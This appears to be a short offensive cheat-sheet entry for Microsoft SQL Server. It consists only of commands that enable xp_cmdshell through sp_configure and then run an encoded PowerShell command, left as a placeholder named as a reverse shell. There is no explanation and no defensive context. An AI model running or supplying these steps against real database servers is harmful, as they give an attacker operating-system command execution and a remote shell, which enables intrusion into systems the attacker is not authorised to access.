# MSSQL

```
EXEC sp_configure 'show advanced options',1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell',1;
RECONFIGURE;
EXEC master.dbo.xp_cmdshell 'powershell -enc $ENCODED_REV_SHELL';
```
